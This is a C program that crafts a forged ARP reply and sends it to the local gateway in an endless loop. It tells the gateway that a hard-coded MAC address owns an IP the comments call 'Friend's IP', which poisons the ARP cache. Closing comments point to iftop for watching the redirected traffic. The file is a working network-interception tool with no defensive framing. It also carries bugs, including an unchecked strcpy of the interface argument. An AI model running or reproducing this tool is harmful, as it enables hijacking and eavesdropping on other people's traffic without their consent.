#include <sys/socket.h>
#include <sys/ioctl.h>
#include<unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in.h>       // IPPROTO_RAW, INET_ADDRSTRLEN
#include <netinet/ip.h>       // IP_MAXPACKET (which is 65535)
#include <net/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
struct arphdr
{
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;
  uint8_t plen;
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint8_t sender_ip[4];

  uint8_t target_mac[6];
  uint8_t target_ip[4];
};

int main(int argc,char* argv[])
{
	int sfd = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
	char  interface[40];
	strcpy (interface, argv[1]);
	if(sfd==-1)
	{
		perror("socket");
	}
	char* buf = (char*)malloc(1500);
	uint8_t src[6],dst[6];

	src[0] = 0xF4;
	src[1] = 0x8E;
	src[2] = 0x38;
	src[3] = 0xF9;
	src[4] = 0x51;
	src[5] = 0xD4;

	//local gateway
	dst[0] = 0xd8;
	dst[1] = 0x9d;
	dst[2] = 0x67;
	dst[3] = 0x63;
	dst[4] = 0x4d;
	dst[5] = 0x24;
	
	memcpy(buf,dst,6*(sizeof (uint8_t)));
	memcpy(buf+6*(sizeof (uint8_t)),src,6*(sizeof (uint8_t)));
	
	buf[12] = ETH_P_ARP / 256;
	buf[13] = ETH_P_ARP % 256;
	
	struct arphdr* arp = (struct arphdr*)(buf+14);
	arp->htype = htons(1);
	
	arp->ptype = 8;
	arp->hlen = 6;
	arp->plen = 4;
	arp->opcode = htons(2);
	
	memcpy(arp->sender_mac ,src,6*(sizeof(uint8_t)));
	memcpy(arp->target_mac ,dst,6*(sizeof(uint8_t)));

	// Friend's IP
	arp->sender_ip[0] = 202;
	arp->sender_ip[1] = 141;
	arp->sender_ip[2] = 49;
	arp->sender_ip[3] = 75;
	
	//Gateway IP
	arp->target_ip[0] = 192;
	arp->target_ip[1] = 168;
	arp->target_ip[2] = 192;
	arp->target_ip[3] = 6;
	
	memcpy(buf+14,arp,28);
	
	int bytes;
		
        struct sockaddr_ll device;
        memset (&device, 0, sizeof (device));
	if ((device.sll_ifindex = if_nametoindex (interface)) == 0)
	{
		perror ("if_nametoindex() failed to obtain interface index ");
		exit (EXIT_FAILURE);
	}
	printf ("Index for interface %s is %i\n", interface, device.sll_ifindex);
        device.sll_family = AF_PACKET;
 	memcpy (device.sll_addr, dst, 6 * sizeof (uint8_t));
	device.sll_halen = 6;
	
	printf("%hhu:",dst[0]);
	printf("%hhu:",dst[1]);
	printf("%hhu:",dst[2]);
	printf("%hhu:",dst[3]);
	printf("%hhu:",dst[4]);
	printf("%hhu\n",dst[5]);
			    
	while(1)	
        {
  	      if ((bytes = sendto (sfd, buf,42, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) 
	      {
			perror ("sendto() failed");
			exit (EXIT_FAILURE);
	      }
        }
}
//arp -a gives router IP and MAC and interface of router
//sudo iftop to show all data packets through that router
